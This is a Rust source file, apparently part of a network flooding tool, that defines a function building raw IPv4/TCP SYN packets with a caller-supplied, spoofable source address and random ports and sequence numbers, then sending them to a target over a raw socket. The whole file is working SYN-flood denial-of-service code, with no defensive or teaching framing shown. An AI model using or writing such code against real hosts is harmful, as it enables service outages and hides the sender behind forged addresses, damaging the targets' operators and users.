use anyhow::Result;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags};
use pnet::packet::Packet;
use pnet::transport::transport_channel;
use pnet::transport::TransportChannelType::Layer3;
use rand::Rng;
use std::net::Ipv4Addr;

use crate::flood::IPV4_HEADER_LEN;
use crate::flood::IP_TTL;
use crate::flood::TCP_BUFF_SIZE;
use crate::flood::TCP_DATA_LEN;
use crate::flood::TCP_HEADER_LEN;
use crate::utils;

pub fn send_syn_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<()> {
    let tcp_protocol = Layer3(IpNextHeaderProtocols::Tcp);
    let (mut tcp_tx, _) = match transport_channel(TCP_BUFF_SIZE, tcp_protocol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => return Err(e.into()),
    };

    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff[..]).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_total_length((IPV4_HEADER_LEN + TCP_HEADER_LEN + TCP_DATA_LEN) as u16);
    let id = utils::random_u16();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(IP_TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    let c = checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(rng.gen());
    tcp_header.set_destination(rng.gen());
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);

    // set tcp header as ip payload
    ip_header.set_payload(tcp_header.packet());
    match tcp_tx.send_to(ip_header, dst_ipv4.into()) {
        _ => (),
    }
    Ok(())
}
